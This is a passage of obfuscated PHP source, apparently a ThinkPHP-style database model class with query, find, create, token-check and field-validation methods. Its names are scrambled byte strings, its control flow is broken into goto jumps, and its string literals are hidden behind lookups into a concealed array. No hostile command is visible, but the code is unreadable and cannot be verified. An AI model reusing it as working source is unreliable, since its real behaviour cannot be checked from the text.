$bÎ­­ ùˆ”; goto f„…Ù¢°½; a‡Õ°ÛõÆİ: $bÎ­­ ùˆ” = $this->db->select($bÓ¹Ù¥ß“Š); if (!1 === $bÎ­­ ùˆ”) { return !1; } if (empty($bÎ­­ ùˆ”)) { return null; } goto B÷¥®ÍŠŞù; f„…Ù¢°½: } protected function _afterSelect(&$B‰×ÎÂé…Ä, $cãÆ›ôàÔ¬) { } public function buildSql($cñã »¥áÖ = array()) { $B¤¥› ¦ŒÜ =& $_SERVER[£ü]; $cñã »¥áÖ = $this->_parseOptions($cñã »¥áÖ); return $B¤¥› ¦ŒÜ[262] . $this->db->buildSelectSql($cñã »¥áÖ) . $B¤¥› ¦ŒÜ[263]; } public function optionsValue($EÛÔ¾¬è³ = null) { if (is_null($EÛÔ¾¬è³)) { return $this->options; } elseif (is_array($EÛÔ¾¬è³)) { $this->options = array_merge($this->options, $EÛÔ¾¬è³); } } protected function _parseOptions($DÛ«áİ¸¦í = array()) { goto aÛ¡ë“å‚; c‹ºÑ»ñÙŠ: if (!isset($DÛ«áİ¸¦í[$f®ùÈßåòµ[264]])) { $DÛ«áİ¸¦í[$f®ùÈßåòµ[264]] = $this->getTableName(); $fñÓ‡Åôñ = $this->fields; } else { $fñÓ‡Åôñ = $this->getDbFields(); } if (!empty($DÛ«áİ¸¦í[$f®ùÈßåòµ[265]])) { $DÛ«áİ¸¦í[$f®ùÈßåòµ[264]] .= $f®ùÈßåòµ[50] . $DÛ«áİ¸¦í[$f®ùÈßåòµ[265]]; } $DÛ«áİ¸¦í[$f®ùÈßåòµ[266]] = $this->name; goto då•è½ÖÍ; aÛ¡ë“å‚: $f®ùÈßåòµ =& $_SERVER[£ü]; if (is_array($DÛ«áİ¸¦í)) { $DÛ«áİ¸¦í = array_merge($this->options, $DÛ«áİ¸¦í); } $this->options = array(); goto c‹ºÑ»ñÙŠ; då•è½ÖÍ: if (isset($DÛ«áİ¸¦í[$f®ùÈßåòµ[260]]) && is_array($DÛ«áİ¸¦í[$f®ùÈßåòµ[260]]) && !empty($fñÓ‡Åôñ) && !isset($DÛ«áİ¸¦í[$f®ùÈßåòµ[267]]) && !isset($DÛ«áİ¸¦í[$f®ùÈßåòµ[264]])) { foreach ($DÛ«áİ¸¦í[$f®ùÈßåòµ[260]] as $c£à¥¡àªÍ => $bòÌßÕå’») { $c£à¥¡àªÍ = trim($c£à¥¡àªÍ); if (in_array($c£à¥¡àªÍ, $fñÓ‡Åôñ, !0)) { if (is_scalar($bòÌßÕå’»)) { $this->_parseType($DÛ«áİ¸¦í[$f®ùÈßåòµ[260]], $c£à¥¡àªÍ); } } elseif (!is_numeric($c£à¥¡àªÍ) && $f®ùÈßåòµ[70] != substr($c£à¥¡àªÍ, 0, 1) && !1 === strpos($c£à¥¡àªÍ, $f®ùÈßåòµ[93]) && !1 === strpos($c£à¥¡àªÍ, $f®ùÈßåòµ[245]) && !1 === strpos($c£à¥¡àªÍ, $f®ùÈßåòµ[268]) && !1 === strpos($c£à¥¡àªÍ, $f®ùÈßåòµ[269])) { unset($DÛ«áİ¸¦í[$f®ùÈßåòµ[260]][$c£à¥¡àªÍ]); } } } $this->_options_filter($DÛ«áİ¸¦í); return $DÛ«áİ¸¦í; goto fÒƒØ¢º±ä; fÒƒØ¢º±ä: } protected function _options_filter(&$c‘ªí–†ä ) { } protected function _parseType(&$CÎ§òë«, $aéÚºÈ²) { $AÅ ŞÄÛÊ‰ =& $_SERVER[£ü]; if (empty($this->options[$AÅ ŞÄÛÊ‰[270]][$AÅ ŞÄÛÊ‰[4] . $aéÚºÈ²])) { $F”×‰ñ‹ = strtolower($this->fields[$AÅ ŞÄÛÊ‰[237]][$aéÚºÈ²]); if (!1 !== strpos($F”×‰ñ‹, $AÅ ŞÄÛÊ‰[271])) { } elseif (!1 === strpos($F”×‰ñ‹, $AÅ ŞÄÛÊ‰[272]) && !1 !== strpos($F”×‰ñ‹, $AÅ ŞÄÛÊ‰[273])) { $CÎ§òë«[$aéÚºÈ²] = intval($CÎ§òë«[$aéÚºÈ²]); } elseif (!1 !== strpos($F”×‰ñ‹, $AÅ ŞÄÛÊ‰[274]) || !1 !== strpos($F”×‰ñ‹, $AÅ ŞÄÛÊ‰[275])) { $CÎ§òë«[$aéÚºÈ²] = floatval($CÎ§òë«[$aéÚºÈ²]); } elseif (!1 !== strpos($F”×‰ñ‹, $AÅ ŞÄÛÊ‰[276])) { $CÎ§òë«[$aéÚºÈ²] = (bool) $CÎ§òë«[$aéÚºÈ²]; } } } public function find($EÎá–Ä°Ş‡ = array()) { goto c‹Ä¡ñÜƒ; A¼àÃ¢± : if (empty($AîÌÛ¹¿æù)) { return null; } $this->data = $AîÌÛ¹¿æù[0]; $this->_afterFind($this->data, $EÎá–Ä°Ş‡); goto CÅ¨³µ¸‹ó; CÅ¨³µ¸‹ó: if (!empty($this->options[$fåœÉÌ™ç™[278]])) { return $this->returnResult($this->data, $this->options[$fåœÉÌ™ç™[278]]); } return $this->data; goto A¸»Šç¶äÌ; Dœ÷ÇÏİåÑ: $EÎá–Ä°Ş‡ = $this->_parseOptions(); $AîÌÛ¹¿æù = $this->db->select($EÎá–Ä°Ş‡); if (!1 === $AîÌÛ¹¿æù) { return !1; } goto A¼àÃ¢± ; c‹Ä¡ñÜƒ: $fåœÉÌ™ç™ =& $_SERVER[£ü]; if (is_numeric($EÎá–Ä°Ş‡) || is_string($EÎá–Ä°Ş‡)) { $fÛ“œ¬¥»[$this->getPk()] = intval($EÎá–Ä°Ş‡); $this->options[$fåœÉÌ™ç™[260]] = $fÛ“œ¬¥»; } $this->options[$fåœÉÌ™ç™[277]] = 1; goto Dœ÷ÇÏİåÑ; A¸»Šç¶äÌ: } protected function _afterFind(&$eù”äõ×‘˜, $D×Ö„æ²³Ó) { } protected function returnResult($CäÜ“ëĞ³Ü, $B¯¨âÇŒõç = '') { $CâÔÜÑÓÂ =& $_SERVER[£ü]; if ($B¯¨âÇŒõç) { if (is_callable($B¯¨âÇŒõç)) { return call_user_func($B¯¨âÇŒõç, $CäÜ“ëĞ³Ü); } switch (strtolower($B¯¨âÇŒõç)) { case $CâÔÜÑÓÂ[279]: return json_encode($CäÜ“ëĞ³Ü); case $CâÔÜÑÓÂ[280]: return xml_encode($CäÜ“ëĞ³Ü); } } return $CäÜ“ëĞ³Ü; } public function parseFieldsMap($fìÌ›‘‹è‹, $fª³ÛŞõç… = 1) { if (!empty($this->_map)) { foreach ($this->_map as $eÌ¾„¯ñÙ– => $D‰ÒŠÇâ·) { if ($fª³ÛŞõç… == 1) { if (isset($fìÌ›‘‹è‹[$D‰ÒŠÇâ·])) { $fìÌ›‘‹è‹[$eÌ¾„¯ñÙ–] = $fìÌ›‘‹è‹[$D‰ÒŠÇâ·]; unset($fìÌ›‘‹è‹[$D‰ÒŠÇâ·]); } } else { if (isset($fìÌ›‘‹è‹[$eÌ¾„¯ñÙ–])) { $fìÌ›‘‹è‹[$D‰ÒŠÇâ·] = $fìÌ›‘‹è‹[$eÌ¾„¯ñÙ–]; unset($fìÌ›‘‹è‹[$eÌ¾„¯ñÙ–]); } } } } return $fìÌ›‘‹è‹; } public function setField($f²Û±˜­ÔÏ, $fù ¢…ë¼½ = '') { if (is_array($f²Û±˜­ÔÏ)) { $f´«±ğ”„ = $f²Û±˜­ÔÏ; } else { $f´«±ğ”„[$f²Û±˜­ÔÏ] = $fù ¢…ë¼½; } return $this->save($f´«±ğ”„); } public function setAdd($Déöô’îŒñ, $Dù×–‚Çô = 1) { $Fùæƒ®¦â =& $_SERVER[£ü]; $BÂõœœÎ»© = $Déöô’îŒñ . $Fùæƒ®¦â[281] . $Dù×–‚Çô; if ($Dù×–‚Çô < 0) { $BÂõœœÎ»© = $Déöô’îŒñ . $Dù×–‚Çô; } return $this->setField($Déöô’îŒñ, array($Fùæƒ®¦â[282], $BÂõœœÎ»©)); } public function getField($Féø‡î÷¼, $aßº³ÙÕºê = null) { $FÃˆ¬±Ó ° =& $_SERVER[£ü]; $F•¬İ‰ä[$FÃˆ¬±Ó °[258]] = $Féø‡î÷¼; $F•¬İ‰ä = $this->_parseOptions($F•¬İ‰ä); $Féø‡î÷¼ = trim($Féø‡î÷¼); if (strpos($Féø‡î÷¼, $FÃˆ¬±Ó °[47])) { if (!isset($F•¬İ‰ä[$FÃˆ¬±Ó °[277]])) { $F•¬İ‰ä[$FÃˆ¬±Ó °[277]] = is_numeric($aßº³ÙÕºê) ? $aßº³ÙÕºê : $FÃˆ¬±Ó °[33]; } $EĞå¹¶ë = $this->db->select($F•¬İ‰ä); if (!empty($EĞå¹¶ë)) { goto aĞÊ½áî‹‚; aĞÊ½áî‹‚: $cØĞöî·¨ = explode($FÃˆ¬±Ó °[47], $Féø‡î÷¼); $Féø‡î÷¼ = array_keys($EĞå¹¶ë[0]); $cÂê´Š®¥ = array_shift($Féø‡î÷¼); goto dÃ‚Ş°”ÙÑ; dÃ‚Ş°”ÙÑ: $EÃôÌªĞ¹Ø = array_shift($Féø‡î÷¼); $f»ÄÙ—çªÂ = array(); $C±à—®Ñ•ó = count($cØĞöî·¨); goto eí‚ÒÆÎ¡È; eí‚ÒÆÎ¡È: foreach ($EĞå¹¶ë as $Eª®³ÛÔßÄ) { $DØª¾í†©“ = $Eª®³ÛÔßÄ[$cÂê´Š®¥]; if (2 == $C±à—®Ñ•ó) { $f»ÄÙ—çªÂ[$DØª¾í†©“] = $Eª®³ÛÔßÄ[$EÃôÌªĞ¹Ø]; } else { $f»ÄÙ—çªÂ[$DØª¾í†©“] = is_string($aßº³ÙÕºê) ? implode($aßº³ÙÕºê, $Eª®³ÛÔßÄ) : $Eª®³ÛÔßÄ; } } return $f»ÄÙ—çªÂ; goto f÷„¨ÈŸï²; f÷„¨ÈŸï²: } } else { if (!0 !== $aßº³ÙÕºê) { $F•¬İ‰ä[$FÃˆ¬±Ó °[277]] = is_numeric($aßº³ÙÕºê) ? $aßº³ÙÕºê : 1; } if ($aßº³ÙÕºê === $FÃˆ¬±Ó °[240]) { unset($F•¬İ‰ä[$FÃˆ¬±Ó °[277]]); } $Eª®³ÛÔßÄ = $this->db->select($F•¬İ‰ä); if (!empty($Eª®³ÛÔßÄ)) { if ($aßº³ÙÕºê === $FÃˆ¬±Ó °[240]) { return reset($Eª®³ÛÔßÄ[0]); } if (!0 !== $aßº³ÙÕºê && 1 == $F•¬İ‰ä[$FÃˆ¬±Ó °[277]]) { return reset($Eª®³ÛÔßÄ[0]); } foreach ($Eª®³ÛÔßÄ as $A«¾¸Ü¨½ù) { $f¨ŠÀêÊ[] = $A«¾¸Ü¨½ù[$Féø‡î÷¼]; } return $f¨ŠÀêÊ; } } return null; } public function create($Aïµôö’³ = '', $FµºĞ¤àÜ = '') { goto eÉÃ‡ÊöÚÁ; c„•†ŸÊò­: if ($this->autoCheckFields) { $E°ƒòÙ„åø = $this->getDbFields(); foreach ($Aïµôö’³ as $CÑĞƒË§³© => $Cõ¼‚·¼Àï) { if (!in_array($CÑĞƒË§³©, $E°ƒòÙ„åø)) { unset($Aïµôö’³[$CÑĞƒË§³©]); } elseif (MAGIC_QUOTES_GPC && is_string($Cõ¼‚·¼Àï)) { $Aïµôö’³[$CÑĞƒË§³©] = stripslashes($Cõ¼‚·¼Àï); } } } $this->autoOperation($Aïµôö’³, $FµºĞ¤àÜ); $this->data = $Aïµôö’³; goto a‚è×æÂÓ; eÉÃ‡ÊöÚÁ: $Cñ—”†ëæƒ =& $_SERVER[£ü]; if (empty($Aïµôö’³)) { $Aïµôö’³ = $_POST; } elseif (is_object($Aïµôö’³)) { $Aïµôö’³ = get_object_vars($Aïµôö’³); } if (empty($Aïµôö’³) || !is_array($Aïµôö’³)) { $this->error = think_lang($Cñ—”†ëæƒ[256]); return !1; } goto bÂ»Ñ­“à; b•£ï¶²: if (isset($E°ƒòÙ„åø)) { if (is_string($E°ƒòÙ„åø)) { $E°ƒòÙ„åø = explode($Cñ—”†ëæƒ[47], $E°ƒòÙ„åø); } if (think_config($Cñ—”†ëæƒ[283])) { $E°ƒòÙ„åø[] = think_config($Cñ—”†ëæƒ[284]); } foreach ($Aïµôö’³ as $CÑĞƒË§³© => $Cõ¼‚·¼Àï) { if (!in_array($CÑĞƒË§³©, $E°ƒòÙ„åø)) { unset($Aïµôö’³[$CÑĞƒË§³©]); } } } if (!$this->autoValidation($Aïµôö’³, $FµºĞ¤àÜ)) { return !1; } if (!$this->autoCheckToken($Aïµôö’³)) { $this->error = think_lang($Cñ—”†ëæƒ[285]); return !1; } goto c„•†ŸÊò­; a‚è×æÂÓ: return $Aïµôö’³; goto DÜÉËâ²¥«; bÂ»Ñ­“à: $Aïµôö’³ = $this->parseFieldsMap($Aïµôö’³, 0); $FµºĞ¤àÜ = $FµºĞ¤àÜ ? $FµºĞ¤àÜ : (!empty($Aïµôö’³[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Cñ—”†ëæƒ[258]])) { $E°ƒòÙ„åø = $this->options[$Cñ—”†ëæƒ[258]]; unset($this->options[$Cñ—”†ëæƒ[258]]); } elseif ($FµºĞ¤àÜ == THINK_MODEL_INSERT && isset($this->insertFields)) { $E°ƒòÙ„åø = $this->insertFields; } elseif ($FµºĞ¤àÜ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $E°ƒòÙ„åø = $this->updateFields; } goto b•£ï¶²; DÜÉËâ²¥«: } public function autoCheckToken($e˜çÚç‹…µ) { $E×ËË‘°‡ä =& $_SERVER[£ü]; if (isset($this->options[$E×ËË‘°‡ä[286]]) && !$this->options[$E×ËË‘°‡ä[286]]) { return !0; } if (think_config($E×ËË‘°‡ä[283])) { $Bœ•ÊôàäŒ = think_config($E×ËË‘°‡ä[284]); if (!isset($e˜çÚç‹…µ[$Bœ•ÊôàäŒ]) || Session::get($Bœ•ÊôàäŒ)) { return !1; } list($C‚­âğÜôô, $D³Ì°ğ«£Ï) = explode($E×ËË‘°‡ä[70], $e˜çÚç‹…µ[$Bœ•ÊôàäŒ]); if ($D³Ì°ğ«£Ï && Session::get($Bœ•ÊôàäŒ . $E×ËË‘°‡ä[93] . $C‚­âğÜôô) === $D³Ì°ğ«£Ï) { Session::remove($Bœ•ÊôàäŒ . $E×ËË‘°‡ä[93] . $C‚­âğÜôô); return !0; } if (think_config($E×ËË‘°‡ä[287])) { Session::remove($Bœ•ÊôàäŒ . $E×ËË‘°‡ä[93] . $C‚­âğÜôô); } return !1; } return !0; } public function regex($a¶¨ªÌã, $b„å’ñèˆ) { $aÊÔœ¸†šæ =& $_SERVER[£ü]; $e«£ÙïßĞ° = array($aÊÔœ¸†šæ[288] => $aÊÔœ¸†šæ[289], $aÊÔœ¸†šæ[290] => $aÊÔœ¸†šæ[291], $aÊÔœ¸†šæ[292] => $aÊÔœ¸†šæ[293], $aÊÔœ¸†šæ[294] => $aÊÔœ¸†šæ[295], $aÊÔœ¸†šæ[296] => $aÊÔœ¸†šæ[297], $aÊÔœ¸†šæ[298] => $aÊÔœ¸†šæ[299], $aÊÔœ¸†šæ[300] => $aÊÔœ¸†šæ[301], $aÊÔœ¸†šæ[275] => $aÊÔœ¸†šæ[302], $aÊÔœ¸†šæ[303] => $aÊÔœ¸†šæ[304]); if (isset($e«£ÙïßĞ°[strtolower($b„å’ñèˆ)])) { $b„å’ñèˆ = $e«£ÙïßĞ°[strtolower($b„å’ñèˆ)]; } return preg_match($b„å’ñèˆ, $a¶¨ªÌã) === 1; } private function autoOperation(&$eëùšô³£æ, $fñòÈ¡© ³) { $E‚òÁ…ñãö =& $_SERVER[£ü]; if (!empty($this->options[$E‚òÁ…ñãö[305]])) { $dºá¸áííª = $this->options[$E‚òÁ…ñãö[305]]; unset($this->options[$E‚òÁ…ñãö[305]]); } elseif (!empty($this->_auto)) { $dºá¸áííª = $this->_auto; } if (isset($dºá¸áííª)) { foreach ($dºá¸áííª as $ešî´÷é°ô) { if (empty($ešî´÷é°ô[2])) { $ešî´÷é°ô[2] = THINK_MODEL_INSERT; } if ($fñòÈ¡© ³ == $ešî´÷é°ô[2] || $ešî´÷é°ô[2] == THINK_MODEL_BOTH) { switch (trim($ešî´÷é°ô[3])) { case $E‚òÁ…ñãö[306]: case $E‚òÁ…ñãö[307]: $C­õ™ŸŠ = isset($ešî´÷é°ô[4]) ? (array) $ešî´÷é°ô[4] : array(); if (isset($eëùšô³£æ[$ešî´÷é°ô[0]])) { array_unshift($C­õ™ŸŠ, $eëùšô³£æ[$ešî´÷é°ô[0]]); } if ($E‚òÁ…ñãö[306] == $ešî´÷é°ô[3]) { $eëùšô³£æ[$ešî´÷é°ô[0]] = call_user_func_array($ešî´÷é°ô[1], $C­õ™ŸŠ); } else { $eëùšô³£æ[$ešî´÷é°ô[0]] = call_user_func_array(array(&$this, $ešî´÷é°ô[1]), $C­õ™ŸŠ); } break; case $E‚òÁ…ñãö[258]: $eëùšô³£æ[$ešî´÷é°ô[0]] = $eëùšô³£æ[$ešî´÷é°ô[1]]; break; case $E‚òÁ…ñãö[308]: if ($E‚òÁ…ñãö[33] === $eëùšô³£æ[$ešî´÷é°ô[0]]) { unset($eëùšô³£æ[$ešî´÷é°ô[0]]); } break; case $E‚òÁ…ñãö[309]: default: $eëùšô³£æ[$ešî´÷é°ô[0]] = $ešî´÷é°ô[1]; } if (!1 === $eëùšô³£æ[$ešî´÷é°ô[0]]) { unset($eëùšô³£æ[$ešî´÷é°ô[0]]); } } } } return $eëùšô³£æ; } protected function autoValidation($e·´Ãè†È´, $EœçßöËÕ) { $f¨ŠÂë¥ğ =& $_SERVER[£ü]; if (!empty($this->options[$f¨ŠÂë¥ğ[310]])) { $DÓßØ†Æõ = $this->options[$f¨ŠÂë¥ğ[310]]; unset($this->options[$f¨ŠÂë¥ğ[310]]); } elseif (!empty($this->_validate)) { $DÓßØ†Æõ = $this->_validate; } if (isset($DÓßØ†Æõ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($DÓßØ†Æõ as $fÒ¼ƒÓ‚Ş‘ => $dÓÉŒø¨÷è) { if (empty($dÓÉŒø¨÷è[5]) || $dÓÉŒø¨÷è[5] == THINK_MODEL_BOTH || $dÓÉŒø¨÷è[5] == $EœçßöËÕ) { if (0 == strpos($dÓÉŒø¨÷è[2], $f¨ŠÂë¥ğ[311]) && strpos($dÓÉŒø¨÷è[2], $f¨ŠÂë¥ğ[312])) { $dÓÉŒø¨÷è[2] = think_lang(substr($dÓÉŒø¨÷è[2], 2, -1)); } $dÓÉŒø¨÷è[3] = isset($dÓÉŒø¨÷è[3]) ? $dÓÉŒø¨÷è[3] : THINK_EXISTS_VALIDATE; $dÓÉŒø¨÷è[4] = isset($dÓÉŒø¨÷è[4]) ? $dÓÉŒø¨÷è[4] : $f¨ŠÂë¥ğ[313]; switch ($dÓÉŒø¨÷è[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($e·´Ãè†È´, $dÓÉŒø¨÷è)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($f¨ŠÂë¥ğ[33] != trim($e·´Ãè†È´[$dÓÉŒø¨÷è[0]])) { if (!1 === $this->_validationField($e·´Ãè†È´, $dÓÉŒø¨÷è)) { return !1; } } break; default: if (isset($e·´Ãè†È´[$dÓÉŒø¨÷è[0]])) { if (!1 === $this->_validationField($e·´Ãè†È´, $dÓÉŒø¨÷è)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($cÍ—Î‡Â, $A‚ß®‘åÉ¾) { if (!1 === $this->_validationFieldItem($cÍ—Î‡Â, $A‚ß®‘åÉ¾)) { if ($this->patchValidate) { $this->error[$A‚ß®‘åÉ¾[0]] = $A‚ß®‘åÉ¾[2]; } else { $this->error = $A‚ß®‘åÉ¾[2]; return !1; } } return; } protected function _validationFieldItem($Eƒà“¹ØÂ—, $a®ìÑÆƒ×) { $bâí¨¿Š =& $_SERVER[£ü]; switch (strtolower(trim($a®ìÑÆƒ×[4]))) { case $bâí¨¿Š[306]: case $bâí¨¿Š[307]: $Dóé§»ŞØ = isset($a®ìÑÆƒ×[6]) ? (array) $a®ìÑÆƒ×[6] : array(); if (is_string($a®ìÑÆƒ×[0]) && strpos($a®ìÑÆƒ×[0], $bâí¨¿Š[47])) { $a®ìÑÆƒ×[0] = explode($bâí¨¿Š[47], $a®ìÑÆƒ×[0]); } if (is_array($a®ìÑÆƒ×[0])) { foreach ($a®ìÑÆƒ×[0] as $D½Ê‡ç°ÈÌ) { $DÖ±œåìÊ[$D½Ê‡ç°ÈÌ] = $Eƒà“¹ØÂ—[$D½Ê‡ç°ÈÌ]; } array_unshift($Dóé§»ŞØ, $DÖ±œåìÊ); } else { array_unshift($Dóé§»ŞØ, $Eƒà“¹ØÂ—[$a®ìÑÆƒ×[0]]); } if ($bâí¨¿Š[306] == $a®ìÑÆƒ×[4]) { return call_user_func_array($a®ìÑÆƒ×[1], $Dóé§»ŞØ); } else { return call_user_func_array(array(&$this, $a®ìÑÆƒ×[1]), $Dóé§»ŞØ); } case $bâí¨¿Š[314]: return $Eƒà“¹ØÂ—[$a®ìÑÆƒ×[0]] == $Eƒà“¹ØÂ—[$a®ìÑÆƒ×[1]]; case $bâí¨¿Š[315]: if (is_string($a®ìÑÆƒ×[0]) && strpos($a®ìÑÆƒ×[0], $bâí¨¿Š[47])) { $a®ìÑÆƒ×[0] = explode($bâí¨¿Š[47], $a®ìÑÆƒ×[0]); } $F…‹ñ ‚È = array(); if (is_array($a®ìÑÆƒ×[0])) { foreach ($a®ìÑÆƒ×[0] as $D½Ê‡ç°ÈÌ) { $F…‹ñ ‚È[$D½Ê‡ç°ÈÌ] = $Eƒà“¹ØÂ—[$D½Ê‡ç°ÈÌ]; } } else { $F…‹ñ ‚È[$a®ìÑÆƒ×[0]] = $Eƒà“¹ØÂ—[$a®ìÑÆƒ×[0]]; } if (!empty($Eƒà“¹ØÂ—[$this->getPk()])) { $F…‹ñ ‚È[$this->getPk()] = array($bâí¨¿Š[316], $Eƒà“¹ØÂ—[$this->getPk()]); } if ($this->where($F…‹ñ ‚È)->find()) { return !1; } return !0; default: return $this->check($Eƒà“¹ØÂ—[$a®ìÑÆƒ×[0]], $a®ìÑÆƒ×[1], $a®ìÑÆƒ×[4]); } } public function check($e¬íî¶×¹Û, $FëƒîõêğÖ, $a†‚¨Â¹‡¼ = "\x72\145\147\x65\170") { $Aè½¨¡÷¬ß =& $_SERVER[£ü]; $a†‚¨Â¹‡¼ = strtolower(trim($a†‚¨Â¹‡¼)); switch ($a†‚¨Â¹‡¼) { case $Aè½¨¡÷¬ß[7]: case $Aè½¨¡÷¬ß[317]: $CŸ¡¡Ö–¡ø = is_array($FëƒîõêğÖ) ? $FëƒîõêğÖ : explode($Aè½¨¡÷¬ß[47], $FëƒîõêğÖ); return $a†‚¨Â¹‡¼ == $Aè½¨¡÷¬ß[7] ? in_array($e¬íî¶×¹Û, $CŸ¡¡Ö–¡ø) : !in_array($e¬íî¶×¹Û, $CŸ¡¡Ö–¡ø); case $Aè½¨¡÷¬ß[318]: case $Aè½¨¡÷¬ß[319]: if (is_array($FëƒîõêğÖ)) { $f›Œßäö¾§ = $FëƒîõêğÖ[0]; $dŒŞÔÈ‹ò = $FëƒîõêğÖ[1]; } else { list($f›Œßäö¾§, $dŒŞÔÈ‹ò) = explode($Aè½¨¡÷¬ß[47], $FëƒîõêğÖ); } return $a†‚¨Â¹‡¼ == $Aè½¨¡÷¬ß[318] ? $e¬íî¶×¹Û >= $f›Œßäö¾§ && $e¬íî¶×¹Û <= $dŒŞÔÈ‹ò : $e¬íî¶×¹Û < $f›Œßäö¾§ || $e¬íî¶×¹Û > $dŒŞÔÈ‹ò; case $Aè½¨¡÷¬ß[320]: case $Aè½¨¡÷¬ß[321]: return $a†‚¨Â¹‡¼ == $Aè½¨¡÷¬ß[320] ? $e¬íî¶×¹Û == $FëƒîõêğÖ : $e¬íî¶×¹Û != $FëƒîõêğÖ; case $Aè½¨¡÷¬ß[322]: $E»“øÙƒñ¢ = mb_strlen($e¬íî¶×¹Û, $Aè½¨¡÷¬ß[323]); if (strpos($FëƒîõêğÖ, $Aè½¨¡÷¬ß[47])) { list($f›Œßäö¾§, $dŒŞÔÈ‹ò) = explode($Aè½¨¡÷¬ß[47], $FëƒîõêğÖ); return $E»“øÙƒñ¢ >= $f›Œßäö¾§ && $E»“øÙƒñ¢ <= $dŒŞÔÈ‹ò; } else { return $E»“øÙƒñ¢ == $FëƒîõêğÖ; } case $Aè½¨¡÷¬ß[324]: list($E°½¬Œñ†Ş, $d²²£‰˜») = explode($Aè½¨¡÷¬ß[47], $FëƒîõêğÖ); if (!is_numeric($E°½¬Œñ†Ş)) { $E°½¬Œñ†Ş = strtotime($E°½¬Œñ†Ş); } if (!is_numeric($d²²£‰˜»)) { $d²²£‰˜» = strtotime($d²²£‰˜»); } return NOW_TIME >= $E°½¬Œñ†Ş && NOW_TIME <= $d²²£‰˜»; case $Aè½¨¡÷¬ß[325]: return in_array(get_client_ip(), explode($Aè½¨¡÷¬ß[47], $FëƒîõêğÖ)); case $Aè½¨¡÷¬ß[326]: return !in_array(get_client_ip(), explode($Aè½¨¡÷¬ß[47], $FëƒîõêğÖ)); case $Aè½¨¡÷¬ß[313]: default: return $this->regex($e¬íî¶×¹Û, $FëƒîõêğÖ); } } public function query($eáÁäËÖ, $F§ƒêßÃ©¡ = false) { $E÷ÂÜ²øŒÇ =& $_SERVER[£ü]; if (!is_bool($F§ƒêßÃ©¡) && !is_array($F§ƒêßÃ©¡)) { $F§ƒêßÃ©¡ = func_get_args(); array_shift($F§ƒêßÃ©¡); } $eáÁäËÖ = str_replace(array($E÷ÂÜ²øŒÇ[214], $E÷ÂÜ²øŒÇ[327]), $E÷ÂÜ²øŒÇ[50], $eáÁäËÖ); $eáÁäËÖ = $this->parseSql($eáÁäËÖ, $F§ƒêßÃ©¡); return $this->db->query($eáÁäËÖ); } public function execute($bÈïÒç¯¼„, $c¿ÅëÏÛ¾Ú = false) { if (!is_bool($c¿ÅëÏÛ¾Ú) && !is_array($c¿ÅëÏÛ¾Ú)) { $c¿ÅëÏÛ¾Ú = func_get_args(); array_shift($c¿ÅëÏÛ¾Ú); } $bÈïÒç¯¼„ = $this->parseSql($bÈïÒç¯¼„, $c¿ÅëÏÛ¾Ú); return $this->db->execute($bÈïÒç¯¼„); } protected function parseSql($a§Ì¾ƒÕì, $BÛ¢‰Ú°¡œ) { $f¸´¼íÍææ =& $_SERVER[£ü]; if (!0 === $BÛ¢‰Ú°¡œ) { $D¥·¸±² = $this->_parseOptions(); $a§Ì¾ƒÕì = $this->db->parseSql($a§Ì¾ƒÕì, $D¥·¸±²); } elseif (is_array($BÛ¢‰Ú°¡œ)) { $BÛ¢‰Ú°¡œ = array_map(array($this->db, $f¸´¼íÍææ[328]), $BÛ¢‰Ú°¡œ); $a§Ì¾ƒÕì = vsprintf($a§Ì¾ƒÕì, $BÛ¢‰Ú°¡œ); } else { $a§Ì¾ƒÕì = strtr($a§Ì¾ƒÕì, array($f¸´¼íÍææ[329] => $this->getTableName(), $f¸´¼íÍææ[330] => think_config($f¸´¼íÍææ[229]))); } $this->db->setModel($this->name); return $a§Ì¾ƒÕì; } public function db($DÊõ†Ÿ¿–à = '', $f¹ÑŞ•Û¸è = '', $açÁëğ¾Ë× = array()) { goto f£“ˆ¢ªš³; f£“ˆ¢ªš³: $cŒ¦Ğñ£  =& $_SERVER[£ü]; if ($cŒ¦Ğñ£ [33] === $DÊõ†Ÿ¿–à && $this->db) { return $this->db; } static $b¨ˆêÑÊ™¬ = array(); goto d³Ñ”Œ°’; d³Ñ”Œ°’: static $B’ª‘ÍÓáÉ = array(); if (!isset($B’ª‘ÍÓáÉ[$DÊõ†Ÿ¿–à]) || isset($B’ª‘ÍÓáÉ[$DÊõ†Ÿ¿–à]) && $f¹ÑŞ•Û¸è && $b¨ˆêÑÊ™¬[$DÊõ†Ÿ¿–à] != $f¹ÑŞ•Û¸è) { if (!empty($f¹ÑŞ•Û¸è) && is_string($f¹ÑŞ•Û¸è) && !1 === strpos($f¹ÑŞ•Û¸è, $cŒ¦Ğñ£ [8])) { $f¹ÑŞ•Û¸è = think_config($f¹ÑŞ•Û¸è); } $B’ª‘ÍÓáÉ[$DÊõ†Ÿ¿–à] = Db::getInstance($f¹ÑŞ•Û¸è); } elseif (NULL === $f¹ÑŞ•Û¸è) { $B’ª‘ÍÓáÉ[$DÊõ†Ÿ¿–à]->close(); unset($B’ª‘ÍÓáÉ[$DÊõ†Ÿ¿–à]); return; } if (!empty($açÁëğ¾Ë×)) { if (is_string($açÁëğ¾Ë×)) { parse_str($açÁëğ¾Ë×, $açÁëğ¾Ë×); } foreach ($açÁëğ¾Ë× as $Eõ©ò‘Îˆ‘ => $Eˆ™Ìº÷æ¿) { $this->setProperty($Eõ©ò‘Îˆ‘, $Eˆ™Ìº÷æ¿); } } goto cñÓÏÇ¬ÓÔ; cñÓÏÇ¬ÓÔ: $b¨ˆêÑÊ™¬[$DÊõ†Ÿ¿–à] = $f¹ÑŞ•Û¸è; $this->db = $B’ª‘ÍÓáÉ[$DÊõ†Ÿ¿–à]; $this->_after_db(); goto f›óÒØÌ´å; f›óÒØÌ´å: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto b¤Å–Áğ¸ß; b¤Å–Áğ¸ß: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $aƒî¤Ÿ’œÈ = get_class($this); if ($aƒî¤Ÿ’œÈ == $_SERVER[£ü][331]) { return $this->name; } $this->name = substr($aƒî¤Ÿ’œÈ, 0, -5); } return $this->name; } public function getTableName() { $eÓÈ¼½×ˆ =& 